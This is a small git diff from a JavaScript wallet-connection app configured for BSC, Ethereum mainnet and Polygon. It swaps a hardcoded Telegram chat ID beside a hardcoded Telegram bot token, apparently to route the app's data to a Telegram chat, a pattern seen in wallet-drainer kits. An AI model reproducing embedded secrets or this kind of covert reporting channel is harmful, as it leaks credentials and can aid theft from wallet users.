@@ -18,7 +18,7 @@ const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef6
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4931121242'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
 
 const networks = [bsc, mainnet, polygon]
 const networkMap = {
